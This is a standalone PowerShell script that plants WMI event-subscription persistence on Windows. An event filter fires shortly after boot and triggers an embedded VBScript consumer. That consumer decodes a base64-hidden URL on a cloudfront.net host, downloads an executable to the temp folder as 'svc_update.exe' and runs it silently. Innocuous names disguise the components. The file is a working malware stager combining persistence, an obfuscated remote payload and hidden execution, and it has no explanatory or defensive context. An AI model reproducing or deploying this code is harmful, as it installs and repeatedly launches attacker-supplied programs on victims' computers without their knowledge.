# Create Event Filter (triggers on boot)
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name="SystemBootCheck"
    EventNamespace="root\cimv2"
    QueryLanguage="WQL"
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
}

# Create ActiveScriptEventConsumer with base64 encoding/decoding
$ConsumerScript = @'
<script language="VBScript">
Option Explicit

Function Base64Decode(ByVal strBase64)
    Dim objXML, objNode
    Set objXML = CreateObject("MSXML2.DOMDocument.3.0")
    Set objNode = objXML.CreateElement("base64")
    objNode.DataType = "bin.base64"
    objNode.Text = strBase64
    Base64Decode = objNode.NodeTypedValue
    Set objNode = Nothing
    Set objXML = Nothing
End Function

Function DecodeBase64ToString(ByVal strBase64)
    Dim arrBytes, strReturn, i
    arrBytes = Base64Decode(strBase64)
    strReturn = ""
    For i = 1 To LenB(arrBytes)
        strReturn = strReturn & Chr(AscB(MidB(arrBytes, i, 1)))
    Next
    DecodeBase64ToString = strReturn
End Function

Function DownloadAndExecute()
    Dim objXMLHTTP, objADOStream, objFSO, objShell
    Dim strEncodedURL, strFileURL, strHDLocation

    ' Base64 encoded URL
    strEncodedURL = "aHR0cHM6Ly9kMnB4YXgzbXVnZWUwMS5jbG91ZGZyb250Lm5ldC9zdmNfdXBkYXRlci5leGU="
    
    ' Decode the URL at runtime
    strFileURL = DecodeBase64ToString(strEncodedURL)
    
    ' Set target location
    strHDLocation = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\svc_update.exe"

    ' Create objects for the operation
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    Set objADOStream = CreateObject("ADODB.Stream")
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objShell = CreateObject("WScript.Shell")
    
    ' Download the file
    objXMLHTTP.Open "GET", strFileURL, False
    objXMLHTTP.Send
    
    If objXMLHTTP.Status = 200 Then
        objADOStream.Open
        objADOStream.Type = 1 'Binary
        objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.Position = 0
        
        ' Save the file to disk
        If objFSO.FileExists(strHDLocation) Then objFSO.DeleteFile strHDLocation
        objADOStream.SaveToFile strHDLocation
        objADOStream.Close
        
        ' Execute the file
        objShell.Run strHDLocation, 0, False
    End If
    
    ' Clean up objects
    Set objXMLHTTP = Nothing
    Set objADOStream = Nothing
    Set objFSO = Nothing
    Set objShell = Nothing
End Function

' Call the function
DownloadAndExecute()
</script>
'@

# Create the script consumer
$Consumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace "root\subscription" -Arguments @{
    Name="SystemBootConsumer"
    ScriptingEngine="VBScript"
    ScriptText=$ConsumerScript
}

# Bind Filter to Consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}